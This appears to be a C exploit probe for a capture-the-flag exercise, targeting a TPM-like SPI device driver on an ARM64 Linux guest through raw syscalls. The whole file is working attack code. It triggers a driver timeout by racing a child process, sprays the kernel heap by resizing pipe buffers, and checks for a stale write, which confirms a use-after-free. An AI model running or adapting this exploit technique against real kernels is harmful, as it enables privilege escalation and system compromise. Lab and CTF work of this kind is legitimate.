/* Local CTF guest diagnostic; compiled together with raw_probe syscall helpers. */
static u8 flood[4096];
static int pipes[8][2];
int main(void){
 say("UAF_PIPE_TEST\n");u64 mask=1;call(122,0,8,(long)&mask,0,0,0);
 int fd=call(56,-100,(long)"/dev/spi-tpm0",2,0,0,0);struct gen g;fill(&g,0,sizeof(g));long r=call(29,fd,0xc0184301UL,(long)&g,0,0,0);
 logrow(-1,-1,r,g.status,g.key,0);if(r||g.status)return 1;
 for(int k=0;k<8;k++){
   long p=call(59,(long)pipes[k],0x4800,0,0,0,0);long s=call(25,pipes[k][1],1031,524288,0,0,0);
   if(p||s!=524288){logrow(-2,k,p,s,0,0);say("PROBE_COMPLETE\n");return 2;}
   for(int j=0;j<128;j++){u8 ch=0x41+k;if(call(64,pipes[k][1],(long)&ch,1,0,0,0)!=1){say("PIPE_FILL_FAILED\nPROBE_COMPLETE\n");return 3;}}
 }
 say("PIPES_READY\n");
 volatile u32 *shared=(void*)call(222,0,4096,3,0x21,-1,0);if((long)shared<0)return 4;*shared=0;
 long child=call(220,17,0,0,0,0,0);
 if(!child){u64 m=2;call(122,0,8,(long)&m,0,0,0);fill(flood,'Z',sizeof(flood));long t[2]={0,10000000};call(101,(long)t,0,0,0,0,0);for(int i=0;i<4096 && !*shared;i++)call(64,1,(long)flood,sizeof(flood),0,0,0);call(94,0,0,0,0,0,0);}
 fill(input,0x42,sizeof(input));say("BACKPRESSURE_READY\n");
 for(int i=0;i<32;i++){
   struct crypt c;fill(&c,0,sizeof(c));c.key=g.key;c.cost=1;c.inlen=8;c.cap=4096;c.in=(u64)input;c.out=(u64)output;
   long start=now();r=call(29,fd,0xc0384302UL,(long)&c,0,0,0);long dt=now()-start;
   if(c.status==-110){
     *shared=1;long sizes[8];long t0=now();
     for(int k=0;k<8;k++)sizes[k]=call(25,pipes[k][1],1031,1048576,0,0,0);
     long spray=now()-t0;long t[2]={0,30000000};call(101,(long)t,0,0,0,0,0);
     logrow(0,i,r,c.status,c.outlen,dt);logrow(-3,0,0,0,0,spray);
     int hits=0;
     for(int k=0;k<8;k++){int avail=0;long q=call(29,pipes[k][0],0x541b,(long)&avail,0,0,0);logrow(-4,k,q,sizes[k],avail,0);if(q==0 && avail!=128)hits++;}
     if(hits)say("STALE_WRITE_CONFIRMED\n");else say("NO_PIPE_RING_RECLAIM\n");
     say("PROBE_COMPLETE\n");for(;;){long t[2]={1,0};call(101,(long)t,0,0,0,0,0);}
   }
 }
 *shared=1;say("NO_TIMEOUT\nPROBE_COMPLETE\n");return 0;
}
__attribute__((naked)) void _start(void){__asm__("mov x29,xzr\nmov x30,xzr\nbl main\nmov x8,#94\nsvc #0\nb .");}
